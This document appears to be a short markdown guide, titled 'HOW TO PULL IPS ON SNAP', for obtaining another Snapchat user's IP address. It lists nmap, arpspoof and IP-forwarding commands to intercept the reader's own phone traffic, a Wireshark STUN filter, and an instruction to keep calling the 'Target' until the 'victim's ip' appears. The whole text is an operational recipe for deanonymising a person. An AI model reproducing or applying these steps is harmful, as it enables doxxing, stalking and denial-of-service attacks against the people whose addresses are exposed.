## **HOW TO PULL IPS ON SNAP** 

### **Here is some things you will need in order to make this work:**
**Requirements:**
- Mac OS X / Kali linux (Or any UNIX)
- A Phone where you have snapchat on (Im assuming its a Phone)
- Nmap
- Some tools and little MITM knowledge!
### **Here's how it's done:**
- Download Wireshark -> **https://www.wireshark.org/**
- Download Arpspoof for Mac -> **https://github.com/ivanvza/arpy**
- Fire up terminal and ip forward your laptop/pc with this scripts:

### **On Kali:**
- sudo sysctl net.ipv4.ip_forward = 1
- sudo net.ipv4.ip_forward = 1

### **On Mac:**
- sudo sysctl -w net.inet.ip.forwarding=1

**Find your Devices local ip and write it down.**
- nmap -sn (or -sP) <gateway ip>/24
<br>
**Example:**
- nmap -sn 192.168.0.1/24
<br>
**Spoof your phone.**
- arpspoof -i -t gateway
<br>
**Example:**
- arpspoof -i en0 -t 192.168.0.160 192.168.0.1
<br>
**Sometimes you need to reverse arpspoof aswell so to be safe, switch gateway with phone ip:**
- arpspoof -i en0 -t 192.168.0.1 192.168.0.160
<br>
**Fire up Wireshark and filter on your phone ip with STUN protocol**
-- ip.addr == <phone ip> && stun
<br>
**Example:** 
- ip.addr == 192.168.0.160 && stun
<br>
**Call the Target on snap and keep calling them for around 5 seconds.
Wireshark should throw up some binding requests, then some other STUN ones.
Those last ones are your victim's ip.**
<br>
**Example**
- https://ibb.co/yN4sJjK
- https://ibb.co/hBzCgwB <---- graph to snapchat osint
